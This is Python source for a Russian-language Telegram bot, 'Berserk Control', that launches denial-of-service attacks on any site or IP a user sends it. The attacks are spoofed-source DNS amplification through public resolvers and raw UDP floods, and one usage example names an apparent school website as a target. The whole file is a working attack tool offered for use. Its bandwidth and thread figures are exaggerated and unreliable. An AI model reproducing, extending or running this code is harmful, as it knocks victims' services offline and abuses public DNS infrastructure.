#!/usr/bin/env python3
# ███████╗███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
# █████╗  ███████╗██║   ██║██║     ██║███████╗   ██║    ╚████╔╝ 
# ██╔══╝  ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
# ███████║███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
# ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
#              BERSERK CONTROL — FULL CUSTOMIZATION
#              48 CORES | 384 GB RAM | 10K+ PROXIES

import os
import sys
import time
import socket
import struct
import threading
import asyncio
import random
import re
import json
from datetime import datetime
from collections import defaultdict

# ========== ТЕЛЕГРАМ ==========
import telebot
from telebot.types import Message

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ ТОКЕН НЕ НАЙДЕН!")
    sys.exit(1)

ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
authorized_users = ADMIN_IDS.copy()
active_attacks = {}

bot = telebot.TeleBot(BOT_TOKEN)

# ========== РАСЧЁТ ПОД ЖЕЛЕЗО ==========
try:
    import psutil
    CPU_CORES = os.cpu_count() or 48
    RAM_GB = psutil.virtual_memory().total / (1024**3)
except:
    CPU_CORES = 48
    RAM_GB = 384

MAX_THREADS = CPU_CORES * 20000  # 960 000 потоков максимум
print(f"⚡ CPU: {CPU_CORES} ядер, RAM: {RAM_GB:.1f} ГБ, Макс потоков: {MAX_THREADS}")

# ========== ГИГАНТСКИЙ ПУЛ ПРОКСИ ==========
PROXY_LIST = []
PROXY_INDEX = 0
PROXY_LOCK = threading.Lock()

def load_proxies():
    """Загрузка 10 000+ прокси"""
    global PROXY_LIST
    print("🌐 Загрузка прокси...")
    
    proxy_sources = [
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/http/data.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks4/data.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5/data.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
    ]
    
    all_proxies = []
    import requests
    
    for url in proxy_sources:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                proxies = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d{2,5}\b", r.text)
                all_proxies.extend(proxies)
        except:
            pass
    
    PROXY_LIST = list(set(all_proxies))
    random.shuffle(PROXY_LIST)
    print(f"✅ Загружено {len(PROXY_LIST)} прокси")
    return PROXY_LIST

PROXY_LIST = load_proxies()

def get_next_proxy_ip():
    with PROXY_LOCK:
        if not PROXY_LIST:
            return None
        proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
        PROXY_INDEX += 1
        return proxy.split(':')[0]

# ========== DNS СЕРВЕРЫ ==========
DNS_SERVERS = [
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
    '94.140.14.14', '94.140.15.15', '185.228.168.9', '185.228.169.9',
]

DNS_POOL = DNS_SERVERS * 200
random.shuffle(DNS_POOL)

# ========== DNS QUERY ==========
def create_query(domain='example.com'):
    parts = domain.split('.')
    domain_part = b''
    for part in parts:
        domain_part += bytes([len(part)]) + part.encode()
    domain_part += b'\x00'
    
    tid = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    header = struct.pack('!HHHHHH', tid, flags, questions, 0, 0, 0)
    qtype = 255
    qclass = 1
    edns = b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00'
    
    return header + domain_part + struct.pack('!HH', qtype, qclass) + edns

QUERY = create_query()

# ========== ФУНКЦИЯ РЕЗОЛВИНГА ==========
def resolve_target(target):
    """Преобразует сайт в IP"""
    target = re.sub(r'^https?://', '', target)
    target = target.split('/')[0]
    target = target.split(':')[0]
    
    try:
        ip = socket.gethostbyname(target)
        return target, ip
    except:
        return target, None

# ========== ОСНОВНОЙ ДВИЖОК ==========
class AttackEngine:
    def __init__(self):
        self.running = False
        self.packets = 0
        self.bytes = 0
        self.lock = threading.Lock()
        self.proxy_counter = 0
        self.ip_hdr_cache = {}
        self.udp_cache = []
        
        # Прегенерация UDP заголовков
        for _ in range(10000):
            src = random.randint(1024, 65535)
            self.udp_cache.append(struct.pack('!HHHH', src, 53, 8 + len(QUERY), 0))
    
    def get_ip_header(self, target_ip, fake_ip):
        """Кэширование IP заголовков"""
        key = f"{target_ip}_{fake_ip}"
        if key not in self.ip_hdr_cache:
            self.ip_hdr_cache[key] = struct.pack('!BBHHHBBH4s4s',
                0x45, 0, 40 + len(QUERY), 0, 0, 0, 64, 17, 0,
                socket.inet_aton(fake_ip),
                socket.inet_aton(target_ip)
            )
        return self.ip_hdr_cache[key]
    
    def worker(self, target_ip, use_dns, use_proxy, duration):
        """Воркер с настраиваемыми параметрами"""
        # Создаём сокеты
        socks = []
        for _ in range(20):
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576 * 32)
            socks.append(s)
        
        end = time.time() + duration
        local = 0
        
        while time.time() < end and self.running:
            try:
                for _ in range(50000):
                    self.proxy_counter += 1
                    
                    # Выбор IP для подмены
                    if use_proxy and self.proxy_counter % 100 == 0:
                        fake_ip = get_next_proxy_ip() or '0.0.0.0'
                    else:
                        fake_ip = '0.0.0.0'
                    
                    ip_hdr = self.get_ip_header(target_ip, fake_ip)
                    
                    # Выбор UDP или прямого TCP
                    if use_dns:
                        udp = random.choice(self.udp_cache)
                        dns = random.choice(DNS_POOL)
                        packet = ip_hdr + udp + QUERY
                        target = (dns, 53)
                    else:
                        # Простой UDP flood
                        udp = struct.pack('!HHHH', random.randint(1024, 65535), 80, 0, 0)
                        packet = ip_hdr + udp + random._urandom(1024)
                        target = (target_ip, 80)
                    
                    sock = random.choice(socks)
                    sock.sendto(packet, target)
                    local += 1
                    
                    if local >= 10000:
                        with self.lock:
                            self.packets += local
                            self.bytes += local * len(packet)
                        local = 0
            except:
                continue
        
        if local > 0:
            with self.lock:
                self.packets += local
                self.bytes += local * len(packet)
        
        for s in socks:
            s.close()
    
    def attack(self, target_ip, duration, threads, use_dns, use_proxy):
        """Запуск атаки с заданными параметрами"""
        self.running = True
        self.packets = 0
        self.bytes = 0
        start = time.time()
        
        print(f"\n⚡ Атака на {target_ip}")
        print(f"🔥 Потоков: {threads}")
        print(f"📡 DNS: {'ВКЛ' if use_dns else 'ВЫКЛ'}")
        print(f"🌐 Прокси: {'ВКЛ' if use_proxy else 'ВЫКЛ'}")
        
        workers = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(target_ip, use_dns, use_proxy, duration))
            t.daemon = True
            t.start()
            workers.append(t)
        
        # Мониторинг
        while any(t.is_alive() for t in workers):
            elapsed = time.time() - start
            if elapsed > 0:
                gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
                dns_mult = 70 if use_dns else 1
                target_gbps = gbps * dns_mult
                pps = self.packets / max(elapsed, 0.1)
                
                print(f"\r🔥 {gbps:.2f} Гбит/с | 🎯 {target_gbps:.1f} Гбит/с | 📦 {pps:.0f} п/с | ⏱ {duration - elapsed:.0f} сек", end='')
            time.sleep(1)
        
        for t in workers:
            t.join(timeout=2)
        
        elapsed = time.time() - start
        gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
        dns_mult = 70 if use_dns else 1
        
        return {
            'packets': self.packets,
            'bytes': self.bytes,
            'gbps': gbps,
            'target_gbps': gbps * dns_mult,
            'threads': threads,
            'dns': use_dns,
            'proxy': use_proxy
        }

# ========== ПРОВЕРКА ПРАВ ==========
def is_auth(user_id):
    return user_id in authorized_users

def is_admin(user_id):
    return user_id in ADMIN_IDS

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start'])
def cmd_start(m):
    uid = m.from_user.id
    if not is_auth(uid):
        bot.reply_to(m, "❌ ДОСТУП ЗАПРЕЩЕН")
        return
    
    text = f"""
╔══════════════════════════════════════╗
║     ███████╗███████╗ ██████╗ ██████╗ ║
║     ██╔════╝██╔════╝██╔═══██╗██╔══██╗║
║     █████╗  ███████╗██║   ██║██████╔╝║
║     ██╔══╝  ╚════██║██║   ██║██╔══██╗║
║     ██║     ███████║╚██████╔╝██║  ██║║
║     ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝║
║         BERSERK CONTROL              ║
╚══════════════════════════════════════╝

👤 ID: {uid}
⚡ CPU: {CPU_CORES} ядер
🌐 Прокси: {len(PROXY_LIST)}
🔥 Макс потоков: {MAX_THREADS}

📝 **ФОРМАТ КОМАНДЫ:**
/attack <сайт/IP> <сек> [потоки] [dns] [proxy]

📌 **ПРИМЕРЫ:**
/attack 58shkola.ru 120                # авто (500k потоков, DNS вкл, прокси вкл)
/attack 1.2.3.4 60 100000 dns=0 proxy=0 # 100k потоков, без DNS, без прокси
/attack example.com 300 900000 dns=1 proxy=1 # 900k потоков, всё вкл

🔥 **БЕРСЕРК:**
/berserk <сайт/IP> <сек>               # макс потоков + DNS + прокси
"""
    bot.reply_to(m, text)

@bot.message_handler(commands=['attack'])
def cmd_attack(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ /attack <сайт/IP> <сек> [потоки] [dns=1/0] [proxy=1/0]")
            return
        
        target = parts[1]
        duration = int(parts[2])
        
        # Парсим параметры
        threads = MAX_THREADS // 2  # 480k по умолчанию
        use_dns = True
        use_proxy = True
        
        if len(parts) > 3:
            threads = int(parts[3])
        if len(parts) > 4:
            use_dns = parts[4].split('=')[1] == '1' if '=' in parts[4] else True
        if len(parts) > 5:
            use_proxy = parts[5].split('=')[1] == '1' if '=' in parts[5] else True
        
        # Резолвим цель
        domain, ip = resolve_target(target)
        if not ip:
            bot.reply_to(m, f"❌ Не удалось найти IP для {target}")
            return
        
        bot.reply_to(m, f"""
🔥 АТАКА ЗАПУЩЕНА

🎯 Цель: {target}
📡 Домен: {domain}
🖧 IP: {ip}
⏱ Длительность: {duration} сек
⚙️ Потоков: {threads}
📡 DNS усиление: {'ВКЛ' if use_dns else 'ВЫКЛ'}
🌐 Прокси: {'ВКЛ' if use_proxy else 'ВЫКЛ'}
📊 Ожидаемая скорость: {threads * (70 if use_dns else 1) // 1000} Гбит/с
        """)
        
        active_attacks[m.chat.id] = {'running': True}
        
        def run():
            engine = AttackEngine()
            result = engine.attack(ip, duration, threads, use_dns, use_proxy)
            
            if m.chat.id in active_attacks:
                del active_attacks[m.chat.id]
                
                bot.send_message(m.chat.id, f"""
✅ АТАКА ЗАВЕРШЕНА

📦 Пакетов: {result['packets']:,}
⚡ Твоя скорость: {result['gbps']:.2f} Гбит/с
🎯 Жертва получала: {result['target_gbps']:.1f} Гбит/с
⚙️ Потоков: {result['threads']}
📡 DNS: {'ВКЛ' if result['dns'] else 'ВЫКЛ'}
🌐 Прокси: {'ВКЛ' if result['proxy'] else 'ВЫКЛ'}
                """)
        
        threading.Thread(target=run).start()
        
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['berserk'])
def cmd_berserk(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ /berserk <сайт/IP> <сек>")
            return
        
        target = parts[1]
        duration = int(parts[2])
        
        # Берсерк режим: всё по максимуму
        threads = MAX_THREADS
        use_dns = True
        use_proxy = True
        
        domain, ip = resolve_target(target)
        if not ip:
            bot.reply_to(m, f"❌ Не удалось найти IP для {target}")
            return
        
        bot.reply_to(m, f"""
🔥 **БЕРСЕРК РЕЖИМ АКТИВИРОВАН**

🎯 Цель: {target}
📡 IP: {ip}
⏱ Длительность: {duration} сек
⚡ Потоков: {threads} (МАКСИМУМ)
📡 DNS: ВКЛ
🌐 Прокси: ВКЛ
📊 Ожидаемая скорость: {threads * 70 // 1000} Гбит/с
        """)
        
        active_attacks[m.chat.id] = {'running': True}
        
        def run():
            engine = AttackEngine()
            result = engine.attack(ip, duration, threads, use_dns, use_proxy)
            
            if m.chat.id in active_attacks:
                del active_attacks[m.chat.id]
                
                bot.send_message(m.chat.id, f"""
✅ БЕРСЕРК АТАКА ЗАВЕРШЕНА

📦 Пакетов: {result['packets']:,}
⚡ Твоя скорость: {result['gbps']:.2f} Гбит/с
🎯 Жертва получала: {result['target_gbps']:.1f} Гбит/с
⚙️ Потоков: {result['threads']} (МАКСИМУМ)
                """)
        
        threading.Thread(target=run).start()
        
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['stop'])
def cmd_stop(m):
    if not is_auth(m.from_user.id):
        return
    
    if m.chat.id in active_attacks:
        active_attacks[m.chat.id]['running'] = False
        del active_attacks[m.chat.id]
        bot.reply_to(m, "🛑 АТАКА ОСТАНОВЛЕНА")
    else:
        bot.reply_to(m, "❌ Нет активной атаки")

@bot.message_handler(commands=['proxies'])
def cmd_proxies(m):
    if not is_auth(m.from_user.id):
        return
    
    text = f"""
🌐 **ПРОКСИ СТАТУС**

📊 Всего: {len(PROXY_LIST)}
🔄 Текущий индекс: {PROXY_INDEX % 10000}
✅ Процент: {(PROXY_INDEX % 10000) / len(PROXY_LIST) * 100:.1f}%

🔍 Первые 10:
{chr(10).join(PROXY_LIST[:10])}
"""
    bot.reply_to(m, text)

@bot.message_handler(commands=['add'])
def cmd_add(m):
    if not is_admin(m.from_user.id):
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid not in authorized_users:
            authorized_users.append(uid)
            bot.reply_to(m, f"✅ Добавлен {uid}")
    except:
        bot.reply_to(m, "❌ /add <id>")

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("\n" + "="*70)
    print("🔥 FSOCIETY BERSERK CONTROL 🔥")
    print("="*70)
    print(f"🤖 Бот: @{bot.get_me().username}")
    print(f"⚡ Макс потоков: {MAX_THREADS}")
    print(f"🌐 Прокси: {len(PROXY_LIST)}")
    
    try:
        import requests
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
        print("✅ Вебхук удален")
    except:
        pass
    
    bot.infinity_polling()
